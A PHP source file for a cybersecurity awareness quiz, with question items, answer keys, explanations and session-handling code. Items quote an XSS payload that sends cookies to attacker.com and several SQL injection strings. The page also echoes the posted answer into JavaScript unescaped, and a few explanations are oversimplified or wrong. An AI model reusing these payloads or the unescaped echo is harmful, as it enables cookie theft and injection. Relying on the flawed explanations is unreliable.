<?php
session_start();


$questions = [
    [
        "question" => "A user connects to a VPN abroad and then logs into their bank. The system detects the unusual IP and locks the account. Is this secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "A",
        "explanation" => "This behavior is part of the bank's security system. VPN usage can cause abnormal IP appearance, so some systems perceive this as a potential threat. This is secure for the user, but suspicious for the service provider."
    ],
    [
        "question" => "Ahmet activates a free VPN application for security on a public Wi-Fi network. Then he enters the bank's mobile site and logs into his account with username and password. Is Ahmet's behavior secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "VPNs carry data through a tunnel. However, some free VPNs can monitor or sell unencrypted data. If the VPN server is malicious, there's a possibility of stealing some session information, hijacking cookies, or exposing the connection to man-in-the-middle (MITM) attacks even over HTTPS connections."
    ],
    [
        "question" => "📩 Subject: 'Cybersecurity Awareness Training – Mandatory Participation'<br>From: HR Department <hr@company.com><br>Content: All personnel must participate in the training to be held on May 10, 2025 at 3:00 PM via Microsoft Teams.<br>Meeting link: https://teams.microsoft.com/l/meetup-join/abc123<br>Is this situation risky?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "A",
        "explanation" => "The message appears corporate, and the link is an official Teams link. It looks like a secure training announcement."
    ],
    [
        "question" => "📩 Subject: 'Your credit card has been suspended!'<br>From: Garanti Bank <security@garanti.com><br>Content: Your card has been temporarily suspended due to fraud suspicion. Click to activate: http://garanti-giris.net<br>Does this situation pose a risk?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "'garanti-giris.net' is a fake domain. The real address is 'garanti.com.tr'. They never request critical information this way."
    ],
    [
        "question" => "In a system, after user login, a URL like this is given: https://example.com/dashboard?token=abc123xyz This token never changes, and remains valid even after logout. Is this secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This is a session hijacking vulnerability. If the token always remains the same, if captured, the session can be reused. A new token should be generated when logging in, and should become invalid when logging out."
    ],
    [
        "question" => "In a finance application, the user sees their own account history. However, in reverse engineering of the application, this endpoint is detected: GET /api/transactions?user=all. Normally this function doesn't exist in the application, but when this call is made, transaction history is returned.",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This is a function-level authorization vulnerability. The server returns all data to everyone without checking the authority of the caller of this endpoint. Especially in mobile applications, such 'forgotten debug functions' remain very frequently and can cause major data breaches."
    ],
    [
        "question" => "A user connects to a public Wi-Fi network and uses a VPN application to ensure security. However, DNS traffic passes directly through the device's local DNS server, not through the VPN tunnel. Is this VPN usage scenario secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This situation is a DNS Leak. DNS requests that the VPN should tunnel go directly to the ISP. This causes the user's visited sites to be visible and monitored. VPN should not only hide IP but also redirect DNS."
    ],
    [
        "question" => "A developer sets up a server on DigitalOcean to increase privacy and starts their own OpenVPN service. However, access to this server is provided only with username/password authentication. Is this structure secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "If VPN servers are operated with password-only authentication, they become vulnerable to brute force attacks. Additional layers like Mutual TLS (certificate-based authentication) are essential. Also, without brute force protection, this is a serious vulnerability."
    ],
    [
        "question" => "A user runs a torrent client with VPN. However, when the connection is temporarily cut, the VPN tunnel closes and traffic continues directly over the real IP. The VPN application has no kill-switch (system that stops internet when connection is suddenly cut). Is this usage secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "In VPNs without kill-switch feature, if the connection breaks, traffic flows through the ISP and the real IP address leaks. This creates a serious privacy risk, especially for users performing sensitive operations."
    ],
    [
        "question" => "A developer adds root-access database connection information used in the test environment to the application's config file. This file is uploaded to a public repo. Is there a data security risk in this scenario?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This situation can be classified as sensitive data exposure. Root-access database user information, API keys, and other sensitive data should not be stored directly in the repo. Such information shared on open source platforms like GitHub allows attackers to easily access your system."
    ],
    [
        "question" => "A user activates fingerprint login feature in mobile banking application. Is this situation secure or risky?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "A",
        "explanation" => "Fingerprint login may seem to some users like 'security compromised for convenience'. However, this method is much more secure than username and password combination. Fingerprint data is stored in a special secure area (Secure Enclave/TrustZone) within the device and is not exported."
    ],
    [
        "question" => "A developer uses an external JavaScript file on the website as follows:<br><code>&lt;script src='https://cdn.example.com/lib.js' integrity='sha384-abc123...' crossorigin='anonymous'&gt;&lt;/script&gt;</code><br><br>Is this situation secure or risky?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "A",
        "explanation" => "JavaScript from an external source is generally considered risky. However, if the file's hash is specified with the <code>integrity</code> attribute, the browser only loads content that exactly matches this hash. This prevents content modification. Even if the file is changed, the browser won't load it. This implementation is secure."
    ],
    [
        "question" => "A company adds Google Maps to show their location as follows:<br><code>&lt;iframe src='https://maps.google.com/maps?q=Ankara' width='600' height='450'&gt;&lt;/iframe&gt;</code><br>Is it secure or risky?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "A",
        "explanation" => "iframe usage is often perceived as a potential risk. This is because iframe allows you to embed another web page into your site, which can lead to various attacks. However, here a trusted source, Google's domain, is used. Also, there's only map display in the iframe, no interactive operation is performed. Therefore, it's secure."
    ],
    [
        "question" => "A link is given as follows, is it secure or risky?<br><code>&lt;a href='https://example.com' target='_blank' rel='noopener noreferrer'&gt;example.com&lt;/a&gt;</code><br>",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "A",
        "explanation" => "target='_blank' usage generally poses security risks because the newly opened page can access the original page via window.opener. However, this is prevented with rel='noopener'. noreferrer doesn't send reference information. When used this way, the link is completely secure."
    ],
    [
        "question" => "Is this message secure or risky?<br>Message:<br>📩 Subject: 'Critical security vulnerabilities detected on your computer!'<br>From: Windows Security Team noreply@microsoft.com<br><br>Content: Due to some critical security vulnerabilities detected in your Windows 10, you risk losing all your data.<br><br>Click the link below to secure the system.<br>Download Link: http://microsoft-security-update.com/update-now<br>",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This message is risky. This could be a ransomware attack. A real security update never redirects to an external link. Such messages encourage users to download and run malicious software."
    ],
    [
        "question" => "A user connects to a website to perform banking transactions.<br>The website starts with 'https://' indicating it's secure and shows a green lock icon indicating it has an SSL/TLS certificate.<br>However, when the user carefully examines the site, the SSL certificate's 'Valid from' date is very old and the certificate provider is an untrusted third party.<br>The user enters their password on this site. Is this situation secure or risky?<br>",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This situation is risky. SSL/TLS certificates ensure data is transmitted encrypted. However, only the trustworthiness of the certificate provider is important. Fake certificates are usually used for phishing attacks that try to steal personal information by appearing like a secure site. A real website always gets certificates from a trusted certificate provider and the certificate's validity dates should be current."
    ],
    [
        "question" => "Elif wants to log into a website she frequently uses and opens a link from her bookmarks that she previously visited.<br>The link transmits authentication parameters in the URL by encoding them with base64.<br><br>However, at this time, there are some additional parameters at the end of the URL that she doesn't notice.<br><br>Although the login screen looks familiar, Elif carelessly enters her username and password.<br>The login process doesn't complete as expected and the page reloads.<br>Is this situation risky or secure?<br>",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "URL encoding is widely used in data transmission; however, attackers can abuse this technique by adding parameters to URLs that appear harmless but are functionally dangerous. The URL Elif visited may contain parameters for redirection or data leakage purposes, even though it looks familiar. The fact that the login screen looks familiar interface-wise doesn't mean the site is actually secure. Such situations can be part of phishing attacks. The user exhibits risky behavior because they can't notice small differences in URLs or suspicious redirections."
    ],
    [
        "question" => "A user clicks on a short URL they saw on a social media platform: http://bit.ly/3v6z8aT. This link redirects the user to a site. Is this situation risky or secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This situation is risky. Short URLs (URL shorteners) can redirect to malicious sites, although they're usually used to redirect to a site safely. Short URLs make users vulnerable to phishing attacks because they prevent users from understanding the link."
    ],
    [
        "question" => "Is the following URL secure or risky?<br>URL: http://www.safe-website.com",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This URL is risky. A truly secure site always starts with 'HTTPS'. URLs starting with 'HTTP' are unencrypted and may be vulnerable to attacks that can steal users' information. Especially banking, shopping, and personal information sites should use HTTPS."
    ],
    [
        "question" => "In an e-commerce site, users can comment on products. The system takes the username and message, then adds this information to the database.<br>One day the system administrator notices that all comments in the database have been deleted and replaced with a single line: 'Hacked by X'.<br>On the same day, it's seen in the logs that a user entered the following content in the comment field:<br>'); DELETE FROM comments; --'.<br>What is the security assessment of this behavior?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This is the result of a SQL Injection attack. Since the comment field wasn't properly filtered, the malicious user was able to interfere with the database query and delete the table. Input data must be processed with prepared statements."
    ],
    [
        "question" => "A user typing the following in a shopping site's product search box sees a strange error message: ' OR 1=1 --'. The page shows no products but behaves as if database queries including other users' cart information have been leaked. The site is temporarily closed to access. How do you interpret this behavior?",
        "answers" => [
            "A" => "Just a search error, secure",
            "B" => "Risky, because data can leak"
        ],
        "correct_answer" => "B",
        "explanation" => "If the search box is also connected to SQL queries in the background, unprotected areas can be used by attackers to extract data. Expressions like ' OR 1=1 can call all records, even damage the database structure. This is a classic SQL Injection example."
    ],
    [
        "question" => "Is there risk in the following URL?<br>URL: https://www.example.com/.exe",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This URL is definitely risky. '.exe' extension is a file extension and is usually used for applications. Such a file extension can be dangerous, especially in links clicked in browsers, because it may contain malicious software."
    ],
    [
        "question" => "A user adds the following code to their profile description. If this content is reflected on the page, is it secure or risky?<br><code>&lt;img src='notfound.jpg' onerror='fetch(&#39;http://attacker.com/steal?cookie=&#39; + document.cookie)'&gt;</code><br>",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This is an XSS (Cross-Site Scripting) attack attempt. The <code>onerror</code> attribute added to the user's profile description works when the image can't load and triggers JavaScript code. This code tries to get cookie information from the user's browser and send it to an attacker's server. If the website shows this HTML content from users directly and without filtering on the page, this leads to a serious security vulnerability. Therefore, this behavior is definitely risky."
    ],
    [
        "question" => "A developer creates a search page where users can filter data.<br>User searches are reflected in the URL as follows:<br><code>https://example.com/search?query=shoes%27%20OR%201%3D1</code><br>However, the developer uses prepared statements on the backend. Is this situation secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "A",
        "explanation" => "Although the URL contains <code>' OR 1=1</code> expression, the system uses <strong>parametric queries</strong> (prepared statements) in the background. This method largely eliminates SQL Injection risk. The user's input is not directly placed in the SQL query, it's only evaluated as a parameter. Therefore, although it may look harmful from the outside, when the structure is implemented correctly, it's secure."
    ],
    [
        "question" => "Is the following scenario risky or secure?<br>Scenario:<br>Can starts noticing some strange peculiarities on his computer after installing new software. When he starts working fast and enters passwords, he thinks he's not typing the password correctly each time. A few weeks later he notices his account password has changed, but thinks there's no malicious activity in the software.",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This situation is risky because keylogger software can steal users' passwords and personal information by recording keyboard inputs. Can may have unknowingly installed malicious software on his computer. Keyloggers often work secretly and collect user information. It's very important to be careful when typing your passwords and use only secure software."
    ],
    [
        "question" => "Is the following scenario risky or secure?<br>Scenario:<br>Cem receives a call from an unknown number. The caller introduces himself as an employee from his bank's security department and says Cem's credit card information needs to be updated. Cem shares the information he provides for verification.",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This situation is risky because such phone calls are an example of vishing (voice phishing) attacks. Here the fraudster gains Cem's trust and collects credit card information. Banks generally don't request identity information by phone, so in such situations one should be careful and end the call."
    ],
    [
        "question" => "Selin receives an email from her manager at work. The email states that she needs to make a quick payment to the company's finance department. Although the email contains her manager's signature and the company logo, no verification is done before clicking the attached link.<br>Is this situation secure or risky?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This could be a whaling (CEO fraud) attack. It aims to deceive users by acting like a real manager. Internal company verification should always be done."
    ],
    [
        "question" => "Is the following URL secure or risky?<br>URL: https://www.abc-company.com%20login",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This URL is risky. The %20 code in the URL is the equivalent of the space character in URLs. Such characters are not used in real URLs. Sometimes cyber attackers can make URLs harder to notice by adding hidden characters to URLs."
    ],
    [
        "question" => "Is there danger in this URL?<br>URL: <code>https://webapp.com/comment?msg=%3Cscript%3Ealert('xss')%3C%2Fscript%3E</code>",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "The <code>&lt;script&gt;</code> tag is hidden by encoding. If the server doesn't filter this properly, the browser will decode and trigger the XSS attack."
    ],
    [
        "question" => "Ahmet participates in a cybersecurity competition, analyzes vulnerable systems and reports vulnerabilities. He shares the information he obtains legally with organizers. How is Ahmet's behavior evaluated?",
        "answers" => [
            "A" => "Ethical hacking (White Hat)",
            "B" => "Illegal behavior",
            "C" => "Damaging systems",
            "D" => "Attacking (Black Hat)"
        ],
        "correct_answer" => "A",
        "explanation" => "What Ahmet does is ethical hacker (White Hat) behavior. He detects security vulnerabilities within legal boundaries and shares this information with relevant people or institutions. Such behaviors help systems become more secure."
    ],
    [
        "question" => "Elif, a university student, conducts penetration testing on systems with her school's IT permission. She reports the security vulnerabilities she detects to the school's IT department and supports the correction process. Is Elif's behavior secure?",
        "answers" => [
            "A" => "Ethical hacking (White Hat)",
            "B" => "Illegal behavior",
            "C" => "Damaging the database",
            "D" => "Attacking (Black Hat)"
        ],
        "correct_answer" => "A",
        "explanation" => "Elif's work is a legally permitted security test that contributes to the institution. This behavior falls under ethical hacking and strengthens the system's defense. Such conscious approaches are considered secure."
    ],
    [
        "question" => "Before a company discovers a critical security vulnerability in its software, attackers infiltrate the system using this vulnerability. The vulnerability can only be used through a specific workflow. How secure is this situation?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This is a Zero-day vulnerability. Even if the vulnerability is used in a limited area, it's a serious threat to the system until it's closed."
    ],
    [
        "question" => "A user uses the same password for every online account. A previously leaked password is tried on another site. Is this situation secure or risky?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This is a Credential Stuffing attack. Using the same password on different platforms allows attackers to easily access accounts."
    ],
    [
        "question" => "An e-commerce site caches product prices via CDN. However, real prices are always taken from the server. Even if fake prices are placed on CDN, this operation is not valid. Would this attack be successful?",
        "answers" => [
            "A" => "Yes, it would be successful.",
            "B" => "No, it would not be successful"
        ],
        "correct_answer" => "B",
        "explanation" => "Since prices always come from the server, changes in CDN cache are ineffective. Therefore, the cache poisoning attack fails."
    ],
    [
        "question" => "In a banking application, when two users perform transactions simultaneously, the system confuses the transactions. What kind of security risk does this situation create?",
        "answers" => [
            "A" => "Users' account balances are updated correctly, no problem occurs.",
            "B" => "Sequencing errors can occur between simultaneous transactions, leading to financial losses.",
            "C" => "Transactions wait for each other, users don't experience any interruption in the system."
        ],
        "correct_answer" => "B",
        "explanation" => "This is a Race Condition. Race Condition attacks occur when software cannot properly manage concurrent database access operations. This can lead to serious security vulnerabilities, especially in financial systems. Software should control correct sequencing in all operations."
    ],
    [
        "question" => "Serdar notices some small changes in the banking site's login screen but continues with transactions. Is this scenario secure?",
        "answers" => [
            "A" => "Secure",
            "B" => "Risky"
        ],
        "correct_answer" => "B",
        "explanation" => "This could be a DNS cache poisoning attack. The attacker may have redirected Serdar to a fake site by poisoning the DNS server. In such attacks, users may appear to have entered a real site, but are actually redirected to a fake site. Using DNSSEC can help prevent such attacks."
    ]
    ];

if (isset($_GET['new_test']) && $_GET['new_test'] == 1) {
    // Reset session variables
    unset($_SESSION['selected_questions']);
    unset($_SESSION['current_question_index']);
    unset($_SESSION['correct_answer_count']);
    unset($_SESSION['answered_questions']);
    
    // Clear question indexed variables
    foreach ($_SESSION as $key => $value) {
        if (strpos($key, 'question_') === 0) {
            unset($_SESSION[$key]);
        }
    }
    
    // Redirect to homepage (will show first question)
    header("Location: questions.php");
    exit;
}

// Select random 20 questions at session start
if (!isset($_SESSION['selected_questions'])) {
    // Create array containing all question indices
    $allQuestionIndices = array_keys($questions);
    
    // Shuffle the array
    shuffle($allQuestionIndices);
    
    // Select first 20 questions (or all if total is less than 20)
    $maxQuestionCount = min(20, count($questions));
    $_SESSION['selected_questions'] = array_slice($allQuestionIndices, 0, $maxQuestionCount);
    
    // Set question index to 0 to show first question
    $_SESSION['current_question_index'] = 0;
    
    // Counter for correct answers
    $_SESSION['correct_answer_count'] = 0;
    
    // Array to track answered questions
    $_SESSION['answered_questions'] = [];
}

// If user wants to finish test
if (isset($_GET['finish_test'])) {
    // Redirect to results page
    header("Location: ?result=show");
    exit;
}

// Check if results page should be shown
$showResult = isset($_GET['result']) && $_GET['result'] === 'show';

// If question parameter exists, update session index
if (isset($_GET['question']) && !$showResult) {
    $requestedIndex = intval($_GET['question']);
    
    // Check if requested index is in valid range
    if ($requestedIndex >= 0 && $requestedIndex < count($_SESSION['selected_questions'])) {
        $_SESSION['current_question_index'] = $requestedIndex;
    }
}

// Get current question index
$currentIndex = $_SESSION['current_question_index'];

// Find actual question index
$actualQuestionIndex = $_SESSION['selected_questions'][$currentIndex];

// Current question
$currentQuestion = $questions[$actualQuestionIndex];

// Answer checking
$userAnswer = isset($_POST['answer']) ? $_POST['answer'] : null;
$result = null;

if ($userAnswer !== null) {
    // Add this question to answered questions list
    $_SESSION['answered_questions'][$currentIndex] = $userAnswer;
    
    $result = ($userAnswer === $currentQuestion['correct_answer']) ? 'correct' : 'wrong';
    
    // If correct answer, increment counter
    if ($result === 'correct' && !isset($_SESSION['question_'.$currentIndex.'_correct'])) {
        $_SESSION['correct_answer_count']++;
        $_SESSION['question_'.$currentIndex.'_correct'] = true;
    }
}

// Total answered questions count
$answeredQuestionCount = count($_SESSION['answered_questions']);

// Correct answer percentage
$correctAnswerRate = $answeredQuestionCount > 0 ? 
    round(($_SESSION['correct_answer_count'] / $answeredQuestionCount) * 100) : 0;

// Category-based success rates - can be added in future
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cybersecurity Awareness Test</title>
    <link rel="stylesheet" href="questions.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<body>
    
    <div class="container">
        <div class="header">
            <h1>Cybersecurity Awareness Test</h1>
            <p>Measure your threat recognition and assessment skills</p>
        </div>
        
        <?php if (!$showResult): ?>
        <!-- Progress bar -->
        <div class="progress-bar-container">
            <div class="progress-bar" style="width: <?php echo ($answeredQuestionCount / count($_SESSION['selected_questions'])) * 100; ?>%"></div>
        </div>
        
        <div class="question-card">
            <div class="question-header">
                <div>Question <?php echo ($currentIndex + 1); ?> / <?php echo count($_SESSION['selected_questions']); ?></div>
                <div class="question-category">
                    <?php
                    // Icons and labels for question categories can be added
                    if (strpos(strtolower($currentQuestion['question']), 'vpn') !== false) {
                        echo '<i class="fas fa-shield-alt security-icon"></i> VPN Security';
                    } elseif (strpos(strtolower($currentQuestion['question']), 'email') !== false || strpos(strtolower($currentQuestion['question']), 'mail') !== false) {
                        echo '<i class="fas fa-envelope security-icon"></i> Email Security';
                    } elseif (strpos(strtolower($currentQuestion['question']), 'password') !== false) {
                        echo '<i class="fas fa-key security-icon"></i> Password Security';
                    } elseif (strpos(strtolower($currentQuestion['question']), 'url') !== false || strpos(strtolower($currentQuestion['question']), 'link') !== false) {
                        echo '<i class="fas fa-link security-icon"></i> URL Security';
                    } else {
                        echo '<i class="fas fa-user-shield security-icon"></i> General Security';
                    }
                    ?>
                </div>
            </div>
            
            <div class="question-content">
                <?php echo $currentQuestion['question']; ?>
            </div>
            
            <form id="answer-form" method="post" action="?question=<?php echo $currentIndex; ?>">
                <input type="hidden" id="selected-answer" name="answer" value="">
                
                <div class="answers">
                    <?php foreach ($currentQuestion['answers'] as $letter => $answer): ?>
                    <label class="answer-option <?php 
                        if ($result !== null) {
                            if ($letter === $currentQuestion['correct_answer']) echo 'correct';
                            else if ($letter === $userAnswer && $userAnswer !== $currentQuestion['correct_answer']) echo 'wrong';
                        }
                    ?>" id="answer-<?php echo $letter; ?>" data-answer="<?php echo $letter; ?>">
                        <span class="answer-label"><?php echo $letter; ?></span>
                        <span class="answer-text"><?php echo $answer; ?></span>
                    </label>
                    <?php endforeach; ?>
                </div>
                
                <div class="explanation <?php echo ($result !== null) ? 'show' : ''; ?>">
                    <div class="explanation-header">
                        <?php if ($result === 'correct'): ?>
                            <i class="fas fa-check-circle security-icon safe"></i>Correct!
                        <?php elseif ($result === 'wrong'): ?>
                            <i class="fas fa-exclamation-triangle security-icon risky"></i>Attention!
                        <?php else: ?>
                            <i class="fas fa-info-circle security-icon"></i>Explanation:
                        <?php endif; ?>
                    </div>
                    <div class="explanation-content">
                        <?php echo isset($currentQuestion['explanation']) ? $currentQuestion['explanation'] : ''; ?>
                    </div>
                </div>
                
                <div class="button-group">
                    <?php if ($currentIndex > 0): ?>
                    <a href="?question=<?php echo $currentIndex - 1; ?>" class="button previous">
                        <i class="fas fa-arrow-left"></i> Previous
                    </a>
                    <?php else: ?>
                    <div></div>
                    <?php endif; ?>
                    
                    <button type="button" id="check-answer" class="button <?php echo ($result !== null) ? 'inactive' : ''; ?>" onclick="checkAnswer()" <?php echo ($result !== null) ? 'disabled' : ''; ?>>
                        <i class="fas fa-check"></i> Check Answer
                    </button>
                    
                    <?php if ($currentIndex < count($_SESSION['selected_questions']) - 1): ?>
                    <a href="?question=<?php echo $currentIndex + 1; ?>" class="button next">
                        Next <i class="fas fa-arrow-right"></i>
                    </a>
                    <?php else: ?>
                    <a href="?finish_test=1" class="button finish">
                        Finish Test <i class="fas fa-flag-checkered"></i>
                    </a>
                    <?php endif; ?>
                </div>
            </form>
        </div>
        
        <?php else: ?>
        <!-- Test results -->
        <div class="question-card">
            <div class="result-summary">
                <div class="icon-container">
                    <?php if ($correctAnswerRate >= 80): ?>
                        <i class="fas fa-shield-alt icon safe"></i>
                    <?php elseif ($correctAnswerRate >= 50): ?>
                        <i class="fas fa-exclamation-circle icon"></i>
                    <?php else: ?>
                        <i class="fas fa-bug icon risky"></i>
                    <?php endif; ?>
                </div>
                
                <div class="result-percentage">
                    <span class="result-value"><?php echo $correctAnswerRate; ?></span>
                </div>
                
                <div class="result-text">
                    <p>You answered <?php echo $_SESSION['correct_answer_count']; ?> out of <?php echo $answeredQuestionCount; ?> questions correctly.</p>
                </div>
                
                <div class="result-level 
                    <?php 
                        if ($correctAnswerRate >= 80) echo 'level-high';
                        elseif ($correctAnswerRate >= 50) echo 'level-medium';
                        else echo 'level-low';
                    ?>">
                    <?php 
                        if ($correctAnswerRate >= 80) echo 'Your Cybersecurity Awareness is High';
                        elseif ($correctAnswerRate >= 50) echo 'Your Cybersecurity Awareness is Moderate';
                        else echo 'Your Cybersecurity Awareness Needs Improvement';
                    ?>
                </div>
            </div>
            
            <div class="result-detail">
                <h3>Assessment</h3>
                
                <?php if ($correctAnswerRate >= 80): ?>
                <p>Congratulations! You are quite successful in recognizing and assessing cyber threats. With a proactive approach, you can protect both yourself and those around you.</p>
                <?php elseif ($correctAnswerRate >= 50): ?>
                <p>Good start! You have basic awareness about cybersecurity, but you need improvement in some areas. You can develop yourself by following informative resources.</p>
                <?php else: ?>
                <p>You need to increase your cybersecurity awareness. You should be more careful in your daily digital activities and review your security measures. Taking basic security training would be beneficial.</p>
                <?php endif; ?>
                
                <!-- Recommendations -->
                <h3>Improvement Recommendations</h3>
                <ul>
                    <li>Change your passwords regularly and prefer strong passwords.</li>
                    <li>Use two-factor authentication.</li>
                    <li>Don't open suspicious emails and check URLs before clicking links.</li>
                    <li>Keep your devices and software up to date.</li>
                    <li>Be careful on public Wi-Fi networks.</li>
                </ul>
            </div>
            
            <div class="button-group">
                <a href="?new_test=1" class="restart">
                    <i class="fas fa-redo"></i> Start Again
                </a>
            </div>
        </div>
        <?php endif; ?>
    </div>
    
    <script>
        // JavaScript to run after page loads
        document.addEventListener('DOMContentLoaded', function() {
            // Add click event to answer options
            let options = document.querySelectorAll('.answer-option');
            options.forEach(function(option) {
                option.addEventListener('click', function() {
                    // Clear previous selection
                    options.forEach(o => o.classList.remove('selected'));
                    // Add selected class to clicked one
                    this.classList.add('selected');
                    // Assign value to hidden input
                    document.getElementById('selected-answer').value = this.getAttribute('data-answer');
                    // Activate Check Answer button
                    document.getElementById('check-answer').classList.remove('inactive');
                });
            });

            <?php if ($result !== null): ?>
            // If result exists, add correct/wrong classes
            let correctAnswer = "<?php echo $currentQuestion['correct_answer']; ?>";
            document.getElementById('answer-' + correctAnswer).classList.add('correct');
                
            <?php if ($result === 'wrong'): ?>
            let userAnswer = "<?php echo $userAnswer; ?>";
            document.getElementById('answer-' + userAnswer).classList.add('wrong');
            <?php endif; ?>
                
            // Show explanation
            document.querySelector('.explanation').classList.add('show');
            <?php endif; ?>
        });

        function checkAnswer() {
            const selectedAnswer = document.getElementById('selected-answer').value;
            if (selectedAnswer) {
                document.getElementById('answer-form').submit();
            }
        }
    </script>
</body>
</html>